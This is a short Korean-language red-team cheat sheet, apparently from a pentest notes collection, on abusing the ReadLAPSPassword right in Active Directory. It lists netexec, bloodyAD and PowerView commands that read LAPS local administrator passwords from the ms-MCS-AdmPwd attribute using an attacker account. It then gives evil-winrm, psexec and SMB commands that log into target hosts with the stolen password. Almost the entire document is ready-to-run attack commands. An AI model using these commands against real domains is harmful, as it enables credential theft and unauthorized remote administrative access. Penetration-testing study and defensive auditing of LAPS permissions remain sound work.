# ReadLAPSPassword

LAPS(Local Administrator Password Solution)로 관리되는 로컬 관리자 패스워드를 ms-MCS-AdmPwd 속성에서 읽는다. LAPS가 환경에 배포되어 있어야 한다.

```bash
# LDAP 389로 속성 조회
nxc ldap <DC_IP> -u <공격자계정> -p '<패스워드>' -M laps

bloodyAD --host <DC_IP> -d <도메인> -u <공격자계정> -p '<패스워드>' \
  get search --filter '(ms-mcs-admpwd=*)' --attr ms-mcs-admpwd,name

# 이후 로컬 관리자로 접근 (--local-auth: 도메인 인증 대신 로컬 계정 인증)
nxc smb <대상IP> -u Administrator -p '<LAPS_PASS>' --local-auth  # ← 수정
evil-winrm -i <대상IP> -u Administrator -p '<LAPS_PASS>'
impacket-psexec <도메인>/Administrator:'<LAPS_PASS>'@<대상IP>
```

```powershell
Get-DomainComputer -Identity <대상컴퓨터> -Properties ms-mcs-admpwd  # ← 수정
Find-AdmPwdExtendedRights -ComputerName <대상컴퓨터>
```